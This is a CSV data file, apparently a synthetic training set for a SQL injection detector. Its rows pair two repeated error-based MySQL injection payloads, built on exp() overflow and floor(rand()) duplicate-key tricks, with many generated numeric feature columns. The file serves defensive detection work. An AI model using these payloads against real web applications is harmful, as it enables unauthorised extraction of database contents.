id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000089,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.2937089030919715,273.3080139160156,79.21231842041016,42.30390167236328,97.37318420410156,-1.1466569900512695,84.46253204345703,38.760414123535156,1.1153870820999146,0.28160393238067627,0.16552777588367462,0.3901202976703644,0.12600311636924744,3.7474279403686523,1.4631400108337402,1.0386435985565186,0.6144784688949585,0.13425901532173157,-0.06346426904201508,0.09023577719926834,10.22243595123291,9.38000774383545,3.8451452255249023,-0.07802580296993256,1.744300365447998,0.3153158724308014,0.1385834962129593,0.1996612846851349,0.1917298585176468,1.229749083518982,0.00950714573264122,-0.21327051520347595,2.0605621337890625,0.23990054428577423,0.2948940396308899,2.307126522064209,7.851487159729004,0.8693265914916992,3.1126041412353516,0.2742336094379425,0.5417100191116333,1.018910527229309,0.07539233565330505,-0.004806188866496086,0.18883222341537476,-0.11794482171535492,-0.09354324638843536,0.3472556173801422,0.33725422620773315,0.46174198389053345,0.14407391846179962,0.27974897623062134,-0.15638864040374756,0.2093779444694519,0.4458521902561188,0.061108507215976715,0.1634448915719986,0.21956399083137512,0.0537167489528656,0.33130425214767456,-0.07151605933904648,0.17501260340213776,-0.14463454484939575,0.18954220414161682,0.10017205774784088,0.06737388670444489,0.8143312335014343,0.15506765246391296,0.06124064326286316,-0.012369804084300995,-0.07727134227752686,-0.28376954793930054,0.054037075489759445,0.001839861273765564,0.0315922349691391,0.0016313008964061737,1.1947715282440186,0.32155317068099976,-0.2559889853000641,0.042554616928100586,0.4610452353954315,9.517176628112793,0.8563824892044067,0.37004902958869934,0.01010390929877758,0.7601063251495361,-0.11270256340503693,-0.06762999296188354,0.02664773166179657
GAN_000090,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.045572480223642,272.4941101074219,82.38628387451172,41.77398681640625,103.02045440673828,1.1471412181854248,81.83287048339844,37.091529846191406,1.2344989776611328,0.30030450224876404,0.1579456925392151,0.39412227272987366,0.126057431101799,3.773857593536377,1.598201870918274,1.0280165672302246,0.5892162919044495,0.12089139223098755,-0.07363329082727432,0.10629337280988693,9.684263229370117,9.595489501953125,4.1214118003845215,0.06974602490663528,1.810593605041504,0.2486342489719391,0.12569323182106018,0.1981307864189148,0.1317957043647766,1.1083781719207764,-0.008206140249967575,-0.10909795761108398,2.0307531356811523,0.26128914952278137,0.311705082654953,2.0845870971679688,7.170792579650879,0.8675740361213684,3.0168519020080566,0.5754743218421936,0.4504510164260864,0.9911047220230103,0.029514603316783905,0.020060911774635315,0.017012901604175568,-0.023486733436584473,-0.27943921089172363,0.38926437497138977,0.28428947925567627,0.35399648547172546,0.17156058549880981,0.32157155871391296,-0.2259579598903656,0.052976660430431366,0.47887352108955383,0.06756891310214996,0.11170518398284912,-0.007964648306369781,0.16605187952518463,0.09288473427295685,-0.11336248368024826,0.16558295488357544,0.008305646479129791,-0.014013772830367088,0.07076087594032288,-0.05686371773481369,0.7966768145561218,0.06818874180316925,0.10239136219024658,-0.05117136240005493,0.020533904433250427,-0.18057358264923096,-0.008621733635663986,0.05121851712465286,0.024798613041639328,0.05301516875624657,1.1004265546798706,0.3633347451686859,-0.08679375797510147,0.018179595470428467,0.4151500165462494,9.199873924255371,0.7840477228164673,0.30130964517593384,-0.010326603427529335,0.7155745625495911,-0.15721744298934937,0.02812672033905983,-0.045024335384368896
GAN_000091,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.216002800668135,275.4293518066406,80.95167541503906,41.5461311340332,101.49787139892578,0.26259613037109375,82.72956085205078,37.46331024169922,1.1929221153259277,0.2922004759311676,0.15769492089748383,0.39595478773117065,0.1248580664396286,3.756227731704712,1.3576722145080566,1.1039142608642578,0.6291085481643677,0.11529454588890076,0.006868239492177963,-0.012246117927134037,10.089502334594727,9.605179786682129,3.8573288917541504,0.03072168305516243,1.7631587982177734,0.3153584897518158,0.09872161597013474,0.11393339931964874,0.19046710431575775,1.0790143013000488,-0.049876537173986435,-0.07953959703445435,1.9672590494155884,0.1590215563774109,0.3036726415157318,2.112882137298584,7.5867133140563965,0.9629149436950684,3.143153667449951,0.4533289670944214,0.4937696158885956,0.971290111541748,-0.030602045357227325,0.016836587339639664,0.07614333927631378,-0.16019661724567413,-0.2051694393157959,0.3830300271511078,0.363057404756546,0.3999719023704529,0.17055103182792664,0.2612282335758209,-0.20760631561279297,0.1334896981716156,0.46263587474823,0.06359672546386719,0.09900892525911331,0.08450213074684143,0.06726205348968506,0.14779067039489746,-0.018861494958400726,0.1805342137813568,-0.12897443771362305,-0.008943624794483185,0.11411957442760468,0.04976855218410492,0.8004862070083618,0.15598943829536438,0.08057752251625061,-0.04615521430969238,-0.121750608086586,-0.29902246594429016,0.015884336084127426,-0.09075316786766052,0.030934251844882965,0.012328162789344788,1.1022660732269287,0.2929089069366455,-0.036265209317207336,0.03478436917066574,0.42042410373687744,8.889232635498047,0.8209863901138306,0.2884332239627838,-0.013044646009802818,0.7832642197608948,-0.05006369575858116,-0.08893009275197983,-0.040516652166843414
GAN_000092,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.279143271707693,273.7898864746094,75.94414520263672,40.917110443115234,100.23936462402344,0.5317416191101074,89.06787109375,39.74510955810547,1.0763412714004517,0.2779700458049774,0.16372135281562805,0.3879729211330414,0.12606337666511536,3.7339529991149902,1.1506481170654297,0.9663482904434204,0.574497640132904,0.17477811872959137,-0.23952214419841766,0.022028645500540733,9.87090015411377,9.32814884185791,3.601247787475586,0.04844596982002258,1.7043040990829468,0.3270740807056427,0.03022356703877449,0.0413912832736969,0.09976182878017426,1.1069313287734985,-0.1128910630941391,-0.15979501605033875,2.117722988128662,0.09190457314252853,0.28464198112487793,2.2251691818237305,7.97169828414917,0.9789183735847473,3.036785364151001,0.5627447962760925,0.4595201015472412,1.0547537803649902,0.19340844452381134,0.0051144324243068695,0.415994256734848,-0.22272922098636627,-0.012745186686515808,0.32511454820632935,0.3456771671772003,0.4316800832748413,0.0557573027908802,0.16819168627262115,-0.006498560309410095,0.1490107774734497,0.41652795672416687,0.03607667610049248,0.17682091891765594,0.11782092601060867,-0.07109199464321136,0.41424691677093506,-0.08808684349060059,-0.2281430959701538,-0.16687577962875366,0.12334205955266953,0.13344521820545197,0.01079801470041275,0.7907664179801941,0.05709517002105713,0.08116170763969421,-0.07621894776821136,-0.06240224838256836,-0.1960955411195755,-0.025528814643621445,0.031270623207092285,0.034567635506391525,0.0649554431438446,1.2473037242889404,0.33736684918403625,-0.19835734367370605,0.15398071706295013,0.5202010869979858,9.762591361999512,0.8306564092636108,0.36022987961769104,-0.0003505665226839483,0.7522373795509338,0.007110137492418289,-0.1676001101732254,0.0503128319978714
GAN_000093,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.29579513016475,275.755859375,77.22212982177734,39.67411804199219,101.70712280273438,-0.1504979133605957,87.4112548828125,38.781558990478516,1.213749885559082,0.26868054270744324,0.15934498608112335,0.39037302136421204,0.12516063451766968,3.7402892112731934,1.3970646858215332,1.037596344947815,0.48301538825035095,0.15093065798282623,-0.24546492099761963,-0.04977613687515259,9.580168724060059,9.217055320739746,3.2598867416381836,0.02646246924996376,1.72420072555542,0.2638207674026489,-0.0498884879052639,0.02241373062133789,0.06149822100996971,1.0284092426300049,0.053511641919612885,0.0687289610505104,1.8614341020584106,0.2952266335487366,0.3255051076412201,1.9760764837265015,7.456701755523682,0.7045711874961853,2.8438374996185303,0.7368948459625244,0.394395649433136,1.1502150297164917,-0.08753042668104172,-0.011032046750187874,0.1877862811088562,-0.19706405699253082,-0.23626668751239777,0.2862619459629059,0.23306392133235931,0.37126797437667847,0.054278064519166946,0.3041130006313324,-0.1157056987285614,0.13561630249023438,0.44840148091316223,0.030822159722447395,0.06076226755976677,0.11336130648851395,0.13641753792762756,0.1351119875907898,-0.20539569854736328,0.16980870068073273,-0.013348288834095001,0.03942444175481796,0.1257820576429367,0.10005531460046768,0.8228892683982849,0.18995732069015503,0.07137133181095123,-0.18944737315177917,-0.08383163809776306,-0.2157679796218872,0.022984571754932404,0.20912373065948486,0.02304701693356037,0.20790168642997742,1.1612892150878906,0.24677883088588715,-0.2660941779613495,0.02344079315662384,0.5489214658737183,9.211248397827148,0.9069502949714661,0.34654635190963745,-0.042789023369550705,0.7398260831832886,0.03739994019269943,0.112540602684021,-0.22791272401809692
GAN_000094,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.204974430318577,272.64324951171875,78.92276763916016,41.90386199951172,107.5245361328125,2.4335343837738037,85.1669921875,36.916297912597656,0.966036319732666,0.2924763262271881,0.15864558517932892,0.39447638392448425,0.1245165541768074,3.7573182582855225,1.1928884983062744,1.0914467573165894,0.6100419759750366,0.13243041932582855,0.06889770925045013,0.1083136722445488,9.303104400634766,9.83154010772705,4.0337724685668945,0.08343561738729477,1.7432717084884644,0.30104947090148926,-0.04463242366909981,0.06435675919055939,0.16527198255062103,1.1348590850830078,-0.09358768165111542,-0.10175827145576477,1.9451152086257935,-0.0042264871299266815,0.30192068219184875,2.1411359310150146,7.882135391235352,1.0878127813339233,2.8933794498443604,0.42776814103126526,0.37691307067871094,1.0406100749969482,-0.14199408888816833,0.020447153598070145,0.06734752655029297,-0.2224426120519638,-0.18398573994636536,0.38070255517959595,0.3648459017276764,0.38082531094551086,0.1601748913526535,0.17262808978557587,-0.13493095338344574,0.21689870953559875,0.4647871255874634,0.05585860088467598,0.0999884158372879,0.11130376905202866,0.07434616982936859,0.09255830198526382,0.05572759360074997,-0.06704771518707275,-0.19617685675621033,0.0123542919754982,0.09120868146419525,-0.03409675136208534,0.7248444557189941,0.15749454498291016,0.17412468791007996,0.15218573808670044,-0.11500188708305359,-0.11677635461091995,0.009019188582897186,0.06962060928344727,0.039382729679346085,-0.06187122315168381,1.3039230108261108,0.36182528734207153,-0.0035531073808670044,0.038395486772060394,0.4498310089111328,9.169183731079102,0.7942622900009155,0.32527703046798706,-0.0069565121084451675,0.6762804388999939,0.019731469452381134,-0.07902779430150986,-0.060132283717393875
GAN_000095,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.247891578730822,274.93023681640625,78.34967041015625,39.93861770629883,99.43407440185547,0.5770316123962402,84.08303833007812,38.484378814697266,0.988526463508606,0.2998581826686859,0.16489940881729126,0.3898341953754425,0.1290849894285202,3.770801305770874,1.348433494567871,0.7182280421257019,0.42227062582969666,0.15437188744544983,-0.1089046373963356,0.11392441391944885,9.980116844177246,9.055780410766602,3.7464113235473633,0.04502920061349869,1.7374699115753174,0.29540660977363586,0.02513529360294342,0.03112386167049408,0.05942501500248909,1.153715968132019,-0.04600890353322029,-0.23210003972053528,1.8947556018829346,0.00722074881196022,0.2679859697818756,2.1854329109191895,8.061006546020508,0.9901782274246216,3.2606685161590576,0.6685876846313477,0.4552313983440399,1.036401629447937,0.0541839636862278,0.008175145834684372,0.22843846678733826,-0.1117108017206192,-0.1585513949394226,0.3347586989402771,0.2736656069755554,0.43016642332077026,0.1438462734222412,0.23700293898582458,-0.05224563181400299,0.15815597772598267,0.4879888594150543,0.010179069824516773,0.0789501965045929,-0.020585235208272934,0.08505754172801971,0.3313549757003784,-0.15767651796340942,-0.14313650131225586,-0.1665322184562683,0.20935764908790588,0.10161326825618744,0.058553218841552734,0.7366825938224792,0.3349875509738922,0.05102222412824631,-0.0633944422006607,-0.011196158826351166,-0.05983836203813553,0.17713700234889984,0.03523198515176773,0.03181635960936546,-0.050632692873477936,1.1094272136688232,0.32746413350105286,-0.17994484305381775,0.0984874814748764,0.5500619411468506,9.839286804199219,0.8869253396987915,0.3143730163574219,0.019678190350532532,0.7748284339904785,0.011233903467655182,0.05277347192168236,-0.04849768429994583
GAN_000096,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.246434032167961,272.1587829589844,83.27081298828125,40.42580795288086,99.86109161376953,-0.2199721336364746,84.63683319091797,39.60237121582031,1.2838613986968994,0.27713704109191895,0.1620214879512787,0.3938487768173218,0.12351574748754501,3.7088873386383057,1.2437670230865479,1.289604902267456,0.6670377254486084,0.13063353300094604,-0.16866855323314667,-0.0067221312783658504,10.117724418640137,9.19794750213623,3.7470579147338867,0.003331512212753296,1.6904613971710205,0.25922343134880066,0.17312395572662354,0.03386855125427246,0.08721014112234116,1.093215823173523,-0.10453104972839355,0.07000162452459335,1.9374322891235352,0.2535131573677063,0.3608757257461548,2.1611926555633545,7.548511981964111,0.8493566513061523,3.1505589485168457,0.6418361663818359,0.4792425036430359,1.1124598979949951,-0.03041863441467285,-0.0021885614842176437,0.2383996546268463,-0.2207362800836563,-0.22488611936569214,0.3480183780193329,0.2746639549732208,0.41143256425857544,-0.01573927327990532,0.22901810705661774,-0.167706698179245,0.2886165678501129,0.46066033840179443,0.015855228528380394,0.15210746228694916,0.07386238127946854,0.20596806704998016,0.2837451696395874,-0.1032872200012207,0.011175408959388733,-0.16751602292060852,0.06894291192293167,0.1424790471792221,0.0077505335211753845,0.8744440674781799,0.10774452984333038,0.08142605423927307,-0.13363778591156006,0.026836492121219635,-0.23082570731639862,0.010005876421928406,0.11087626218795776,0.04192489758133888,0.014804039150476456,1.2715966701507568,0.33452746272087097,-0.18944963812828064,0.011979758739471436,0.4604679048061371,9.018877983093262,0.8529947996139526,0.3381228744983673,-0.023120487108826637,0.7905489206314087,0.03808478266000748,-0.0578567311167717,-0.10194847732782364
GAN_000097,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000255,5.067198969435765,270.7044677734375,82.61968994140625,41.69588851928711,100.39972686767578,0.19385957717895508,81.27287292480469,37.06150436401367,1.2695600986480713,0.3003971576690674,0.16079193353652954,0.39328381419181824,0.12607231736183167,3.7750942707061768,1.500490665435791,0.8745698928833008,0.5222893357276917,0.11678225547075272,-0.11661219596862793,0.158100888133049,9.91397762298584,9.554708480834961,4.087226867675781,0.016330406069755554,1.7687445878982544,0.24877755343914032,0.10355591773986816,0.20480993390083313,0.1180138811469078,1.0280416011810303,0.019236277788877487,-0.09872687608003616,2.0114386081695557,0.21909287571907043,0.31306183338165283,2.0955471992492676,7.530323505401611,0.9085504412651062,3.0727362632751465,0.5785714983940125,0.4534902274608612,0.9816101789474487,0.05146986246109009,0.01648530922830105,0.0771009773015976,-0.06824710965156555,-0.20062674582004547,0.3664518892765045,0.3219742774963379,0.3512570261955261,0.18245896697044373,0.26345276832580566,-0.15736237168312073,0.037425361573696136,0.4570000171661377,0.04411880671977997,0.1342129111289978,0.019306432455778122,0.08429843187332153,0.2136949896812439,-0.09595011919736862,0.09146726131439209,-0.029255978763103485,-0.005922466516494751,0.10131796449422836,0.055705368518829346,0.8138611316680908,0.10032375156879425,0.043024130165576935,-0.1478915512561798,-0.03484427183866501,-0.24426577985286713,-0.04232421889901161,-0.018633022904396057,0.024795081466436386,0.036949723958969116,1.0693137645721436,0.3515350818634033,-0.10905102640390396,0.062306396663188934,0.44267070293426514,9.178359985351562,0.7885931134223938,0.3069632947444916,-0.0088257547467947,0.7590546607971191,-0.15010416507720947,-0.06771060824394226,-0.1150294840335846
GAN_000098,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.133100546378843,272.92236328125,78.17343139648438,41.64881134033203,103.63236236572266,-0.7219066619873047,85.40737915039062,37.78514862060547,1.0723204612731934,0.304853618144989,0.15994611382484436,0.39266401529312134,0.12707899510860443,3.7753617763519287,1.3283480405807495,0.9314641952514648,0.4891306757926941,0.14680062234401703,-0.02779506705701351,0.20907488465309143,10.141504287719727,9.64426040649414,4.196087837219238,0.08169874548912048,1.7330578565597534,0.27625980973243713,0.025952909141778946,0.06038254499435425,0.04516606405377388,1.12518310546875,-0.12653948366641998,-0.16283918917179108,1.9146314859390259,-0.007863756269216537,0.3068370521068573,2.2530860900878906,8.152029991149902,0.9751249551773071,3.1723012924194336,0.6361912488937378,0.3969304859638214,1.0530675649642944,-0.12398993223905563,-0.0025413911789655685,0.20177015662193298,-0.12337450683116913,-0.26907777786254883,0.36151307821273804,0.34563589096069336,0.3930876553058624,0.09618086367845535,0.16370348632335663,-0.14701016247272491,0.1227729544043541,0.4651470184326172,-0.00711233401671052,0.09068241715431213,-0.031757622957229614,0.12201890349388123,0.25196507573127747,0.018164999783039093,-0.12040187418460846,-0.16533738374710083,0.05865820497274399,0.08891335129737854,0.020966626703739166,0.7321028113365173,0.11257240176200867,0.08149699866771698,0.036310985684394836,-0.005307614803314209,0.004686451517045498,0.043288156390190125,0.05938927084207535,0.048614855855703354,-0.10842554271221161,1.2323172092437744,0.41658666729927063,-0.08033107966184616,0.09539110213518143,0.5030192136764526,9.555537223815918,0.875278115272522,0.3422907590866089,-0.00449160672724247,0.7371658682823181,-0.04481828957796097,0.11908277869224548,-0.023615732789039612
GAN_000099,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.298603154821203,270.4953308105469,78.00133514404297,40.19745635986328,103.88806915283203,1.7287960052490234,83.78008270263672,38.67155075073242,1.140660285949707,0.29921650886535645,0.15962009131908417,0.39770105481147766,0.12427890300750732,3.7697508335113525,1.151977777481079,1.0655052661895752,0.5671206712722778,0.14780330657958984,0.09649830311536789,0.3811517655849457,9.945107460021973,9.328969955444336,4.118526935577393,0.09647326171398163,1.7080355882644653,0.36700284481048584,0.14232105016708374,0.14655816555023193,0.20118528604507446,1.1418405771255493,-0.025979381054639816,-0.06346192210912704,1.9088183641433716,0.1758514642715454,0.31300589442253113,2.111226797103882,7.641347408294678,0.7950640916824341,3.1182875633239746,0.4628962576389313,0.4501984119415283,1.1059154272079468,0.0075215548276901245,0.01742682233452797,0.15941086411476135,-0.34699469804763794,-0.25723040103912354,0.40446722507476807,0.39815258979797363,0.3651752471923828,0.1257845163345337,0.14862065017223358,-0.15442310273647308,0.12668442726135254,0.41947999596595764,0.03807627782225609,0.07284606993198395,0.07454939186573029,-0.04335007071495056,-0.03354161977767944,0.10816765576601028,0.03283227980136871,-0.21706858277320862,-0.0377635657787323,0.11465470492839813,0.025467902421951294,0.7129459381103516,0.2189609706401825,0.15512841939926147,-0.008518122136592865,-0.14113958179950714,-0.4017690122127533,-0.19938519597053528,0.05518253147602081,0.03390222042798996,-0.0738988071680069,1.2815051078796387,0.2066996842622757,-0.1177220568060875,0.046306125819683075,0.4368164837360382,8.866802215576172,0.8218620419502258,0.3026049733161926,-0.05794462189078331,0.785346269607544,-0.05073641985654831,-0.0008391998708248138,-0.27020707726478577
GAN_000100,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.3236168577637,278.08746337890625,75.41544342041016,39.811344146728516,102.3276596069336,-0.1628098487854004,89.06500244140625,39.35694122314453,1.0165379047393799,0.30050599575042725,0.1590755432844162,0.39142659306526184,0.12861314415931702,3.7403323650360107,1.1468955278396606,1.0205758810043335,0.37365034222602844,0.14694932103157043,-0.223899245262146,0.1113186776638031,10.191343307495117,9.226030349731445,3.7017199993133545,0.1555827260017395,1.8419972658157349,0.306975394487381,0.06438468396663666,-0.004523425363004208,-0.01080082543194294,1.1624016761779785,-0.16068382561206818,-0.0957241803407669,1.8084789514541626,-0.04402803257107735,0.3276270031929016,2.2595767974853516,7.9771199226379395,0.8835147023200989,3.4943466186523438,0.7968056797981262,0.46287569403648376,1.130751371383667,-0.21456372737884521,6.461707380367443e-05,0.36464259028434753,-0.16670827567577362,-0.3682819902896881,0.3310204744338989,0.21452128887176514,0.42546945810317993,0.04124291613698006,0.2286853939294815,-0.2831815183162689,0.31137508153915405,0.557968258857727,-0.06787259131669998,0.00018099180306307971,-0.15035080909729004,0.3863515257835388,0.26912981271743774,-0.011126123368740082,-0.08694830536842346,-0.2883259356021881,0.0790945366024971,0.11046038568019867,0.10851509124040604,0.7510661482810974,0.48952117562294006,-0.012638956308364868,-0.04553535580635071,-0.055944427847862244,-0.02401943877339363,0.07675865292549133,0.05100231617689133,0.04715462774038315,-0.06380358338356018,1.1920024156570435,0.36317893862724304,-0.1778852641582489,0.03088381141424179,0.5781877636909485,9.666082382202148,0.9448545575141907,0.3481026887893677,-0.001966884359717369,0.6960932612419128,-0.1834147870540619,0.2189064621925354,-0.05572698637843132
GAN_000101,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000206,5.479168069459784,278.01397705078125,73.20533752441406,42.61567306518555,105.75785827636719,-3.2019715309143066,92.79814910888672,40.13505935668945,1.1473580598831177,0.28500568866729736,0.15918515622615814,0.38722455501556396,0.12761525809764862,3.788843870162964,1.6294896602630615,1.067420244216919,0.5149819254875183,0.16046380996704102,-0.14784683287143707,0.29079297184944153,10.233086585998535,9.269351959228516,4.071163177490234,-0.08990335464477539,1.7075871229171753,0.2998725175857544,-0.10126183927059174,-0.008168249391019344,0.08812318742275238,1.2073049545288086,-0.03153495118021965,-0.36161020398139954,2.0530738830566406,0.22047486901283264,0.2931777536869049,2.18989896774292,7.713122844696045,0.7874787449836731,3.094444513320923,0.5638136863708496,0.49614188075065613,1.0204355716705322,-0.03722943365573883,0.016239726915955544,0.29450497031211853,-0.058818936347961426,-0.15018245577812195,0.41600537300109863,0.3772783875465393,0.46132180094718933,0.11195152252912521,0.2730277478694916,-0.18402573466300964,-0.12453593313694,0.3903183937072754,0.0358765572309494,0.07821466773748398,0.05945506691932678,0.06085292994976044,0.3126698434352875,-0.1397445797920227,0.2729603350162506,-0.11558075994253159,0.12006909400224686,0.07753009349107742,0.04630369693040848,0.6763184666633606,0.27393093705177307,0.14187034964561462,-0.05588698387145996,-0.234810471534729,-0.10394956916570663,0.09697522222995758,0.12188510596752167,0.0398995541036129,-0.03948243707418442,1.1226803064346313,0.22303952276706696,-0.18474137783050537,0.06915375590324402,0.4223118722438812,9.250940322875977,0.943188488483429,0.4082401990890503,-0.06203646585345268,0.7679652571678162,-0.05707130581140518,0.28780677914619446,0.014371499419212341
